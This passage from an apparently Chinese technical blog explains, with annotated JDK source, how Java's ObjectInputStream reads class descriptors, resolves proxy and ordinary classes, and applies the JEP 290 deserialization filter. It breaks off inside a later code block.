&lt;li&gt;调用</span></span><br><span class="line"><span class="comment"> *       &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> *       Proxy.getProxyClass(</span></span><br><span class="line"><span class="comment"> *           hasNonPublicInterface ? nonPublicLoader : latestLoader,</span></span><br><span class="line"><span class="comment"> *           classObjs)</span></span><br><span class="line"><span class="comment"> *       &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *       生成代理类；若参数非法导致其抛出 &#123;<span class="doctag">@link</span> IllegalArgumentException&#125;，</span></span><br><span class="line"><span class="comment"> *       此处包装为 &#123;<span class="doctag">@link</span> ClassNotFoundException&#125; 抛出（与反序列化解析失败语义统一）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> interfaces 代理类描述符中反序列化得到的“接口全限定名”列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 由这些接口组成的代理类 Class 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException  底层 I/O 异常（默认实现通常不会抛）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 找不到某个接口/无法生成代理类时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1) 选择“最近的用户类加载器”，找不到就用 null（走引导/系统路径）</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">latestLoader</span> <span class="operator">=</span> latestUserDefinedLoader();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录是否存在“非 public 接口”，以及这些接口共同要求的类加载器</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">nonPublicLoader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">hasNonPublicInterface</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 逐个解析接口名为 Class，并校验非 public 接口的类加载器一致性</span></span><br><span class="line">    Class&lt;?&gt;[] classObjs = <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[interfaces.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 被动初始化（不执行 &lt;clinit&gt;），用 latestLoader 解析接口</span></span><br><span class="line">        Class&lt;?&gt; cl = Class.forName(interfaces[i], <span class="comment">/* initialize = */</span> <span class="literal">false</span>, latestLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若接口“非 public”，JDK 规定：生成的代理类必须定义在这些非 public 接口所属的</span></span><br><span class="line">        <span class="comment">// 同一个类加载器下；否则将破坏封装/可访问性，直接抛 IllegalAccessError</span></span><br><span class="line">        <span class="keyword">if</span> ((cl.getModifiers() &amp; Modifier.PUBLIC) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hasNonPublicInterface) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nonPublicLoader != cl.getClassLoader()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalAccessError</span>(</span><br><span class="line">                        <span class="string">&quot;conflicting non-public interface class loaders&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nonPublicLoader = cl.getClassLoader();</span><br><span class="line">                hasNonPublicInterface = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        classObjs[i] = cl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 生成代理类：</span></span><br><span class="line">    <span class="comment">//    - 若存在非 public 接口：必须使用其类加载器定义代理类；</span></span><br><span class="line">    <span class="comment">//    - 否则：使用 latestLoader（或 null）定义代理类。</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.getProxyClass(</span><br><span class="line">            hasNonPublicInterface ? nonPublicLoader : latestLoader,</span><br><span class="line">            classObjs);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// 语义统一：将参数非法（如接口重复、非接口类型等）包装为 CNF 抛给上层</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="literal">null</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于普通类，则先调用 <code>readClassDescriptor</code> 获取类相关信息。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从序列化流中读取一个“类描述符”（ObjectStreamClass）。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;当 OIS 期待下一个项目是“类描述符”时调用本方法。子类可覆盖以读取由</span></span><br><span class="line"><span class="comment"> * 自定义 OOS（覆盖了 writeClassDescriptor）的“非标准格式”描述符；</span></span><br><span class="line"><span class="comment"> * 默认按《对象序列化规范》定义的标准格式读取。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  读到的类描述符（仅包含“主体信息”，尚未解析为本地 Class）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  IOException            I/O 错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  ClassNotFoundException 若描述符体内引用的类型解析失败</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectOutputStream#writeClassDescriptor(java.io.ObjectStreamClass)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> ObjectStreamClass <span class="title function_">readClassDescriptor</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamClass</span>();</span><br><span class="line">    <span class="comment">// 读取“普通（非代理）类”的描述符主体（类名、SUID、flags、字段表等）</span></span><br><span class="line">    <span class="comment">// 注意：此时得到的 desc 还不可直接用于实例读写，后续由 initNonProxy(...) 补完。</span></span><br><span class="line">    desc.readNonProxy(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从给定的 OIS 中读取“非代理类”的类描述符主体信息。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;读出的结果尚不完整：它只能作为 resolveClass(...) 和</span></span><br><span class="line"><span class="comment"> * ObjectStreamClass.initNonProxy(...) 的输入，后者会把“本地 Class、</span></span><br><span class="line"><span class="comment"> * 父类描述符”等信息补全到该描述符里。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in  输入的 ObjectInputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException              I/O 或协议错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException   当字段签名等需要解析的类型找不到时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">readNonProxy</span><span class="params">(ObjectInputStream in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 1) 类名（MUTF-8，二进制名，如 java.lang.String）</span></span><br><span class="line">    name = in.readUTF();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) serialVersionUID（8 字节，大端）</span></span><br><span class="line">    suid = Long.valueOf(in.readLong());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 本描述符是“非代理类”</span></span><br><span class="line">    isProxy = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 读取并解析“类标志位”</span></span><br><span class="line">    <span class="type">byte</span> <span class="variable">flags</span> <span class="operator">=</span> in.readByte();</span><br><span class="line">    <span class="comment">// 是否声明了私有 writeObject(...)：若是，实例数据会包含“自定义数据块”</span></span><br><span class="line">    hasWriteObjectData = ((flags &amp; ObjectStreamConstants.SC_WRITE_METHOD) != <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Externalizable 在 v2 协议下是否以 Block-Data 包裹（v1 不包裹）</span></span><br><span class="line">    hasBlockExternalData = ((flags &amp; ObjectStreamConstants.SC_BLOCK_DATA) != <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 是否 Externalizable（完全自管读写）</span></span><br><span class="line">    externalizable = ((flags &amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 是否 Serializable（默认/自定义 writeObject 机制）</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">sflag</span> <span class="operator">=</span> ((flags &amp; ObjectStreamConstants.SC_SERIALIZABLE) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Externalizable 与 Serializable 互斥</span></span><br><span class="line">    <span class="keyword">if</span> (externalizable &amp;&amp; sflag) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                name, <span class="string">&quot;serializable and externalizable flags conflict&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    serializable = externalizable || sflag;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否枚举类型</span></span><br><span class="line">    isEnum = ((flags &amp; ObjectStreamConstants.SC_ENUM) != <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 规范要求：枚举的 serialVersionUID 必须为 0</span></span><br><span class="line">    <span class="keyword">if</span> (isEnum &amp;&amp; suid.longValue() != <span class="number">0L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                name, <span class="string">&quot;enum descriptor has non-zero serialVersionUID: &quot;</span> + suid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 字段表</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numFields</span> <span class="operator">=</span> in.readShort(); <span class="comment">// 字段数量（非负）</span></span><br><span class="line">    <span class="comment">// 规范要求：枚举类不应有可持久化字段</span></span><br><span class="line">    <span class="keyword">if</span> (isEnum &amp;&amp; numFields != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                name, <span class="string">&quot;enum descriptor has non-zero field count: &quot;</span> + numFields);</span><br><span class="line">    &#125;</span><br><span class="line">    fields = (numFields &gt; <span class="number">0</span>) ? <span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>[numFields] : NO_FIELDS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; numFields; i++) &#123;</span><br><span class="line">        <span class="comment">// 5.1 字段类型码（原始类型：B C D F I J S Z；对象：L；数组：[）</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">tcode</span> <span class="operator">=</span> (<span class="type">char</span>) in.readByte();</span><br><span class="line">        <span class="comment">// 5.2 字段名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fname</span> <span class="operator">=</span> in.readUTF();</span><br><span class="line">        <span class="comment">// 5.3 字段签名：</span></span><br><span class="line">        <span class="comment">//     - 若为对象/数组字段（L 或 [），需要读取“类型签名字符串”（使用对象字符串语义，可句柄共享）</span></span><br><span class="line">        <span class="comment">//     - 若为原始类型，则签名就是单字符类型码本身</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">signature</span> <span class="operator">=</span> ((tcode == <span class="string">&#x27;L&#x27;</span>) || (tcode == <span class="string">&#x27;[&#x27;</span>))</span><br><span class="line">                ? in.readTypeString()</span><br><span class="line">                : <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">char</span>[]&#123; tcode &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 第三个参数 false 表示“非常量字段”（与 serialPersistentFields 的常量优化无关）</span></span><br><span class="line">            fields[i] = <span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>(fname, signature, <span class="literal">false</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="comment">// 若签名非法或字段描述不合规，包装为 InvalidClassException 抛出</span></span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                    name, <span class="string">&quot;invalid descriptor for field &quot;</span> + fname).initCause(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 计算字段偏移/布局信息（用于默认反序列化时按序读写原始与对象字段）</span></span><br><span class="line">    computeFieldOffsets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后调用 <code>resolveClass</code> 根据前面读取类信息实例化的 <code>ObjectStreamClass</code> 从本地加载类。注意这里 <code>Class.forName</code> 的 <code>initialize</code> 参数为 <code>false</code> 因此不会执行静态代码块。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将流中的类描述符（ObjectStreamClass）解析为“本地 JVM 中的 Class”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;可被子类覆盖：例如从自定义的类加载来源（网络/插件沙箱等）加载类。</span></span><br><span class="line"><span class="comment"> * 与输出端的 &#123;<span class="doctag">@code</span> ObjectOutputStream.annotateClass(..)&#125; 相对应——</span></span><br><span class="line"><span class="comment"> * 该方法对同一个类在一次反序列化过程中只会调用一次。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;返回后（若不是数组类），运行时会把返回类的 serialVersionUID 与流内的</span></span><br><span class="line"><span class="comment"> * serialVersionUID 做比较；不匹配则抛 &#123;<span class="doctag">@link</span> InvalidClassException&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;默认实现的策略：</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * Class.forName(desc.getName(), false, latestUserDefinedLoader())</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> * 其中 latestUserDefinedLoader() 会选择“当前调用栈上，最近的一个由</span></span><br><span class="line"><span class="comment"> * 用户自定义类加载器定义的类（且不是反射生成的桥接类）”的那个类加载器；</span></span><br><span class="line"><span class="comment"> * 若找不到，则使用 &#123;<span class="doctag">@code</span> null&#125;（意味着由引导/系统加载器按默认路径加载）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;兼容性补充：</span></span><br><span class="line"><span class="comment"> * 若上述加载抛出 &#123;<span class="doctag">@code</span> ClassNotFoundException&#125;，并且 &#123;<span class="doctag">@code</span> desc.getName()&#125;</span></span><br><span class="line"><span class="comment"> * 恰好是 Java 的原始类型/void 的关键字（如 &quot;int&quot;、&quot;boolean&quot;、&quot;void&quot;），</span></span><br><span class="line"><span class="comment"> * 则返回对应的 &#123;<span class="doctag">@code</span> Class&#125;（如 &#123;<span class="doctag">@code</span> Integer.TYPE&#125;、&#123;<span class="doctag">@code</span> Void.TYPE&#125;）。</span></span><br><span class="line"><span class="comment"> * 否则把原始 &#123;<span class="doctag">@code</span> ClassNotFoundException&#125; 继续抛出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> desc 流中的类描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 与 desc 对应的本地 Class 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 本方法签名允许抛 I/O 异常（默认实现通常不会抛出）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 无法在本地解析该类时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试用“最近的用户自定义类加载器”按“被动初始化（不执行 clinit）”加载目标类</span></span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="comment">/* initialize = */</span> <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// 如果是原始类型或 void 的“关键字名称”，走内置映射表 primClasses 返回对应 Class</span></span><br><span class="line">        <span class="comment">// 例如：&quot;int&quot; -&gt; Integer.TYPE, &quot;boolean&quot; -&gt; Boolean.TYPE, &quot;void&quot; -&gt; Void.TYPE</span></span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 既不是原始类型名，也加载失败 → 继续把 CNF 抛给调用方</span></span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在前面完成类信息的读取以及类加载之后，都会调用 <code>filterCheck</code> 对加载的类进行检查，这个函数实际上就是 JEP290 的过滤函数。</p>
<p>该函数会调用全局默认过滤器 <code>java.io.ObjectInputStream.serialFilter</code> 的 <code>checkInput</code> 函数进行过滤。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调用（若已配置）反序列化过滤器 &#123;<span class="doctag">@code</span> serialFilter&#125; 进行校验。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;若过滤器返回 REJECTED 或在过滤过程中抛出 RuntimeException，</span></span><br><span class="line"><span class="comment"> * 则抛出 &#123;<span class="doctag">@link</span> InvalidClassException&#125; 终止反序列化。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;过滤器用于基于 JEP 290 的“序列化过滤”能力：可按类、数组长度、对象引用数、</span></span><br><span class="line"><span class="comment"> * 嵌套深度、已读字节数等维度做允许/拒绝/未决的判定。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clazz       正在处理的类型（可能为 null，例如仅做计数检查时）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arrayLength 若当前创建/读取的是数组，则为数组长度；非数组传 &#123;<span class="doctag">@code</span> -1&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException 当过滤器拒绝或在过滤过程中抛出运行时异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">filterCheck</span><span class="params">(Class&lt;?&gt; clazz, <span class="type">int</span> arrayLength)</span></span><br><span class="line">        <span class="keyword">throws</span> InvalidClassException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialFilter != <span class="literal">null</span>) &#123; <span class="comment">// 未配置过滤器则直接跳过</span></span><br><span class="line">        <span class="type">RuntimeException</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        ObjectInputFilter.Status status;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若被子类覆盖导致无法获取流信息，则 bytesRead 置 0</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">bytesRead</span> <span class="operator">=</span> (bin == <span class="literal">null</span>) ? <span class="number">0</span> : bin.getBytesRead();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 传入一次性快照：类、数组长度、已见对象引用数、当前嵌套深度、已读字节</span></span><br><span class="line">            status = serialFilter.checkInput(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">FilterValues</span>(clazz, arrayLength, totalObjectRefs, depth, bytesRead));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="comment">// 过滤器自身抛出运行时异常：按“拒绝”处理，同时记录异常作为原因</span></span><br><span class="line">            status = ObjectInputFilter.Status.REJECTED;</span><br><span class="line">            ex = e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 仅当返回 REJECTED 或返回 null（实现不规范）时视为拒绝</span></span><br><span class="line">        <span class="keyword">if</span> (status == <span class="literal">null</span> || status == ObjectInputFilter.Status.REJECTED) &#123;</span><br><span class="line">            <span class="comment">// 失败路径：info 等级日志（若开启）</span></span><br><span class="line">            <span class="keyword">if</span> (Logging.infoLogger != <span class="literal">null</span>) &#123;</span><br><span class="line">                Logging.infoLogger.info(</span><br><span class="line">                    <span class="string">&quot;ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;&quot;</span>,</span><br><span class="line">                    status, clazz, arrayLength, totalObjectRefs, depth, bytesRead,</span><br><span class="line">                    Objects.toString(ex, <span class="string">&quot;n/a&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">InvalidClassException</span> <span class="variable">ice</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;filter status: &quot;</span> + status);</span><br><span class="line">            ice.initCause(ex); <span class="comment">// 将过滤器抛出的运行时异常作为根因链入</span></span><br><span class="line">            <span class="keyword">throw</span> ice;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 成功/未决路径：trace 等级日志（若开启）</span></span><br><span class="line">            <span class="keyword">if</span> (Logging.traceLogger != <span class="literal">null</span>) &#123;</span><br><span class="line">                Logging.traceLogger.finer(</span><br><span class="line">                    <span class="string">&quot;ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;&quot;</span>,</span><br><span class="line">                    status, clazz, arrayLength, totalObjectRefs, depth, bytesRead,</span><br><span class="line">                    Objects.toString(ex, <span class="string">&quot;n/a&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在结束了反序列化内容检测后，会调用 <code>skipCustomData</code> <strong>把当前“自定义数据区”（custom data）里的一切都吃掉，直到读到 <code>TC_ENDBLOCKDATA</code> 为止</strong>——不管里面是纯块数据，还是中间夹了对象&#x2F;数组&#x2F;字符串之类的结构化东西。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 